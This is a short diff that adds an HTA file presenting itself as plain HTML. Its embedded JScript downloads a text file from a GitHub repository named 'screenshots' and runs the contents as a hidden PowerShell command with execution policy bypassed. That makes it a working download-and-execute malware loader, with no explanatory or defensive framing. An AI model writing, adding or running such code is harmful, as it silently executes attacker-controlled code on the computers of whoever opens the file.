@@ -1,0 +1,7 @@
+<html><head><hta:application showintaskbar="no"/><script language=JScript>
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
+x.send();
+var sh=new ActiveXObject("WScript.Shell");
+sh.Run("powershell -ExecutionPolicy Bypass -Command \""+x.responseText.replace(/\n/g,";").replace(/"/g,"\\\"")+"\"",0);
+</script></head></html>
